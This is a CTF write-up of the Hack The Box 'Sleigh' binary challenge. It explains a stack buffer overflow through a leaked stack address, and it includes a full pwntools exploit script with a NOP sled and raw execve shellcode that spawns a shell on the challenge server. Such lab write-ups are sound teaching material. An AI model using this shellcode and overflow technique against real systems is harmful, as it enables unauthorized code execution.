# Sleigh (Day 2)

This challenge provided us with 2 files: 
1.  **sleigh** [Executable of interest]
2.  **flag.txt** [Fake flag used for testing]

I first checked the security protections of **sleigh**:

![checksec](https://user-images.githubusercontent.com/71312079/151155488-c33bce48-9f07-4988-9852-229e6ca33628.png)

Hmm... unlike day 1's challenge we now have PIE enabled but NX is disabled, leading me to 2 observations:
  * Shellcode can be loaded onto the stack and executed 
  * We somehow need to obtain the *base address* of the stack since it changes every time the file is run

I then proceed to run **sleigh** in bash and am greeted with this prompt:
![sleigh](https://user-images.githubusercontent.com/71312079/151155500-cdf2e7e4-51ec-4693-ad8a-ebc9df2bdf95.png)

Selecting **2** would terminate the program so I select **1** and proceed to the next screen: 

![sleigh2](https://user-images.githubusercontent.com/71312079/151155504-4cd19bc3-c778-449b-8aca-a43c5a2336bf.png)

Right away I notice that I am provided with an address at the end of the first line: *0x7ffde4266ec0*, which changes everytime I run the program. Could this be the base address that I was looking for?

Looking at the **repair** function in ghidra, I see that the aforementioned address is actually the address of a variable called **local_48**.

![repair](https://user-images.githubusercontent.com/71312079/151155493-52d9100c-f818-44de-8010-9347aff0e9ad.jpg)

Navigating to the address of **local_48**, I see that it is likely a 64 byte array that seems vulnerable to a buffer overflow.

![local48](https://user-images.githubusercontent.com/71312079/151156975-aec047b3-78ba-433f-80c6-9829af8d7f88.png)

From all the findings above, I now devise a strategy to obtain the flag:
1. Obtain the offset needed to overwrite the buffer until the return address
   * I used the same method as day 1's challenge [Mr Snowy](../Mr%20Snowy/README.md), which also happens to be the same value of **72**.
2. Insert the provided base address so that the function returns to the top of the stack 
3. Place the shellcode somewhere in the buffer so that it will be executed next after the step *2*
   * Shellcode taken from this [writeup](https://ctftime.org/writeup/20861) of a similar CTF challenge
5. Use a *nop sled* to ensure that the shellcode even if the return address is not exact
    * Length of nop sled = Offset [72] - length of shellcode [34] = **38**

I then crafted the following python script:

```python
from pwn import *

p = remote('178.128.35.31', 31238)
offset = 72
p.recvuntil("Abandon")
p.recvuntil("\n")
p.sendline('1')
p.recvuntil(' [')
address = p.recvuntil('\n')[:-2]

for  i in range(2):

	p.recvuntil('\n')

retaddress = p64(int(address,16))

shellcode = b'\xeb\x0b\x5f\x48\x31\xd2\x52\x5e\x6a\x3b\x58\x0f\x05\xe8\xf0\xff\xff\xff\x2f\x2f\x2f\x2f\x62\x69\x6e\x2f\x2f\x2f\x2f\x62\x61\x73\x68\x00'

nops = b'\x90'* 38
payload = [nops, shellcode,retaddress]
payload = b"".join(payload)
p.sendline(payload)
p.interactive()
```

Running the code above provides us with a shell where we can execute **"cat flag.txt"** and obtain the flag.

Flag: `HTB{d4sh1nG_thr0ugH_th3_sn0w_1n_4_0n3_h0r53_0p3n_sl31gh!!!}`
